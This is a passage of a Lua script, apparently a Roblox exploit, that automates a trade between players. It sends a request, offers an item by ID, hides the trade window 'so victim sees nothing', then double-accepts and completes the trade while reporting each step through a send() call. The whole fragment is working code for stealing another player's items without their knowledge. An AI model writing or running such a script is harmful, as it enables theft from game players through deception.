        print("Item ID not found for " .. targetName)
        send("Item ID not found for " .. targetName .. " – aborting trade.")
        return
    end
    send("Found ID for " .. targetName .. ": " .. tostring(itemId))

    -- 2. Send request
    local ok, res = pcall(function() return SendReq:InvokeServer(target) end)
    if not ok then print("SendRequest failed: " .. tostring(res)); return end
    print("Trade request sent")

    wait(1)

    -- 3. Accept request
    pcall(function() AcceptReq:FireServer() end)
    print("Accept request fired")

    wait(1)

    -- 4. Start trade (if needed)
    if StartTr then pcall(function() StartTr:FireServer() end) end

    wait(1)

    -- 5. Offer the item using its ID
    if OfferItem then
        local ok, err = pcall(function() OfferItem:FireServer(itemId) end)
        if ok then
            print("Offered item " .. targetName .. " (ID: " .. tostring(itemId) .. ")")
            send("Offered " .. targetName .. " (ID " .. tostring(itemId) .. ")")
        else
            print("Offer failed: " .. tostring(err))
            send("Offer failed: " .. tostring(err))
        end
    else
        print("OfferItem remote not found")
        send("OfferItem remote missing")
    end

    wait(1)

    -- 6. Hide the trade GUI (so victim sees nothing)
    hideTradeWindow()

    wait(0.5)

    -- 7. Accept trade (double)
    pcall(function() AcceptTr:FireServer() end)
    wait(0.3)
    pcall(function() AcceptTr:FireServer() end)

    wait(0.5)

    -- 8. Complete trade
    if CompleteTr then pcall(function() CompleteTr:FireServer() end) end

    print("=== TRADE COMPLETED ===")
    send("Trade sequence finished.")
end)

